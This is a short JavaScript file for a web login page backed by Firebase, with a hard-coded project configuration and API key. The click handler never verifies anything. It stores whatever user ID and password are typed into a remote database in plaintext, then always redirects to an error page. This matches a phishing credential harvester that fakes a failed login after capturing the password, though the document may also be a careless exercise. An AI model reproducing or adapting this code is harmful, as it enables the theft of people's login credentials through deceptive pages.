  import { initializeApp} from "https://www.gstatic.com/firebasejs/10.4.0/firebase-app.js";
  import { getDatabase, ref, set, get, child, update, remove } from "https://www.gstatic.com/firebasejs/10.4.0/firebase-database.js";


  const firebaseConfig = {
    apiKey: "AIzaSyCJgi7K7qwfZVeAJRUcmmjHNN32MJp66K8",
    authDomain: "dd-task-4cae2.firebaseapp.com",
    projectId: "dd-task-4cae2",
    storageBucket: "dd-task-4cae2.appspot.com",
    messagingSenderId: "10059771489",
    appId: "1:10059771489:web:a787944e7274693df2c420"
  };

  const app = initializeApp(firebaseConfig);
  const db = getDatabase(app);
  
  const userId = document.getElementById('userId');
  const userPassword = document.getElementById('password');  
  const loginBtn = document.getElementById('login_btn');

  loginBtn.addEventListener('click', setData);

function setData(){

  if(userId.value == '' || userPassword.value == ''){
    alert("All Fields are required");
  } else {  
    set(ref(db, 'users/'+userId.value), {
        userId: userId.value,
        password : userPassword.value
      })
      .then( () => {
        location.href = "./error.html"
      })
}
}